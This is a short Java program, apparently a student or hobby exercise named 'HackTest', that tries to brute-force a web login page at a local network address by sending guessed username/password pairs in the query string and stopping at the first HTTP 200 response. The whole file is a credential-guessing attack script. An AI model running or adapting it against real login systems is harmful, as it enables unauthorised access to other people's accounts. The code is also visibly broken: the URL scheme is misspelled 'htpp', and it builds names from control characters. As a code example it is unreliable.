package com.ojas;

import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.sql.Date;




public class HackTest {

	public static void main(String[] args) throws Exception {
		String url = "htpp://192.168.7.48:8084/Cap/check.jsp";

		boolean found = false;
		for(int a=0;a<26;a++) {
			for(int n=0;n<100;n++) {
				String un = ""+(char)a;
				String pw = ""+(char)a;
				
				un += n;
				pw += n;
				
				String turl = url+"?un="+un+"&pw="+pw;
				System.out.println("Trying : "+turl);
				
				URL urlObj = new URL(turl);
		        HttpURLConnection httpCon = (HttpURLConnection) urlObj.openConnection();
		        int responseCode = httpCon.getResponseCode();
		        String responseMessage = httpCon.getResponseMessage();
		        String contentType = httpCon.getContentType();
		        String contentEncoding = httpCon.getContentEncoding();
		        int contentLength = httpCon.getContentLength();
		        long date = httpCon.getDate();
		        long expiration = httpCon.getExpiration();
		        long lastModified = httpCon.getLastModified();
		        
		        System.out.println("Response Code: " + responseCode);
		        System.out.println("Response Message: " + responseMessage);
		        System.out.println("Content Type: " + contentType);
		        System.out.println("Content Encoding: " + contentEncoding);
		        System.out.println("Content Length: " + contentLength);
		        System.out.println("Date: " + new Date(date));
		        System.out.println("Expiration: " + new Date(expiration));
		        System.out.println("Last Modified: " + new Date(lastModified));
		        
		        if(responseCode==200) {
		        	found = true;
		        	break;
		        }
			}
			if(found) {
				System.out.println("Found User Id and Pw");
				break;
			}
		}
		
		

	}

}
